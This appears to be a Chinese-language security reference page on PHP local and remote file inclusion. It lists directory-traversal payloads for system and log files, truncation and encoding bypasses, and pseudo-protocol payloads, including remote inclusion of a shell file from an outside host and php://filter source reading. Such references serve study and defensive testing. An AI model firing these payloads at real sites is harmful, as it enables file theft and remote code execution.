文件包含
========================================

基础
----------------------------------------
常见的文件包含漏洞的形式为 ``<?php include("inc/" . $_GET['file']); ?>``

考虑常用的几种包含方式为

- 同目录包含 ``file=.htaccess``
- 目录遍历 ``?file=../../../../../../../../../var/lib/locate.db``
- 日志注入 ``?file=../../../../../../../../../var/log/apache/error.log``
- 利用 ``/proc/self/environ``

其中日志可以使用SSH日志或者Web日志等多种日志来源测试

触发Sink
----------------------------------------
- PHP
    - include
        - 在包含过程中出错会报错，不影响执行后续语句
    - include_once
        - 仅包含一次
    - require
        - 在包含过程中出错，就会直接退出，不执行后续语句
    - require_once


绕过技巧
----------------------------------------
常见的应用在文件包含之前，可能会调用函数对其进行判断，一般有如下几种绕过方式

url编码绕过
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
如果WAF中是字符串匹配，可以使用url多次编码的方式可以绕过

特殊字符绕过
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 某些情况下，读文件支持使用Shell通配符，如 ``?`` ``*`` 等
- url中 使用 ``?`` ``#`` 可能会影响include包含的结果
- 某些情况下，unicode编码不同但是字形相近的字符有同一个效果

%00截断
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
几乎是最常用的方法，条件是magic_quotes_gpc打开，而且php版本小于5.3.4。

长度截断
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Windows上的文件名长度和文件路径有关。具体关系为：从根目录计算，文件路径长度最长为259个bytes。

msdn定义 ``#define MAX_PATH 260``，其中第260个字符为字符串结尾的 ``\0`` ，而linux可以用getconf来判断文件名长度限制和文件路径长度限制。

获取最长文件路径长度：getconf PATH_MAX /root 得到4096
获取最长文件名：getconf NAME_MAX /root 得到255

那么在长度有限的时候，``././././`` (n个) 的形式就可以通过这个把路径爆掉

在php代码包含中，这种绕过方式要求php版本 < php 5.2.8

伪协议绕过
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 远程包含: 要求 ``allow_url_fopen=On`` 且 ``allow_url_include=On`` ， payload为 ``?file=[http|https|ftp]://websec.wordpress.com/shell.txt`` 的形式
- PHP input: 把payload放在POST参数中作为包含的文件，要求 ``allow_url_include=On`` ，payload为 ``?file=php://input`` 的形式
- Base64: 使用Base64伪协议读取文件，payload为 ``?file=php://filter/convert.base64-encode/resource=index.php`` 的形式
- data: 使用data伪协议读取文件，payload为 ``?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=`` 的形式，要求 ``allow_url_include=On``

参考链接
----------------------------------------
- `Exploit with PHP Protocols <https://www.cdxy.me/?p=752>`_
- `lfi cheat sheet <https://highon.coffee/blog/lfi-cheat-sheet/>`_
